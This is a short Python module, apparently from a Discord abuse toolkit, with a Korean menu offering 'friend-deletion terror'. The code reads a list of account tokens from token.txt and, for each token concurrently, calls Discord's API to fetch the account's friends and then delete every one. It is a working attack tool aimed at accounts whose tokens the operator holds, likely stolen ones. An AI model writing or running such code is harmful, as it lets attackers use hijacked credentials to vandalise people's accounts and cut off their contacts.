import aiohttp
import asyncio

from utils.Setting.setup_most import heads
from utils.Setting.lib import aiohttp, asyncio, time


def menu():
    print('')
    print('')
    print(
        f"""
[\x1b[95m1\x1b[95m\x1B[37m] 친삭 테러
[\x1b[95m2\x1b[95m\x1B[37m] 나가기
"""
    )


async def remove_friend(token: str):
    base_url = "https://discord.com/api/v10/users/@me/relationships"

    async with (
        aiohttp.ClientSession() as session,
        session.get(base_url, headers=heads(token=token)) as response,
    ):
        friend_infos = await response.json()

        for friend_info in friend_infos:
            async with session.delete(
                f"{base_url}/{friend_info['id']}", headers=heads(token=token)
            ) as response:
                pass


async def accounts_bomber():
    tokens: list[str] = []
    with open("token.txt", "r", encoding="utf-8") as f:
        for line in f.readlines():
            # 주석 처리된 문장 무시
            if line.startswith("#"):
                continue
            tokens.append(line)

    await asyncio.gather(*[remove_friend(token=token) for token in tokens])


async def main():
    menu()
    option = int(input(f"[\x1b[95m>\x1b[95m\x1B[37m] 옵션: "))
    if option == 1:
        await accounts_bomber()
        print(f"[\x1b[95m>\x1b[95m\x1B[37m] token.txt에 있는 토큰을 조회하고 해당 토큰의 친구들을 삭제하는 중입니다.\n")
        time.sleep(3)
        await __import__("main").Hydron()
    else:
        await __import__("main").Hydron()
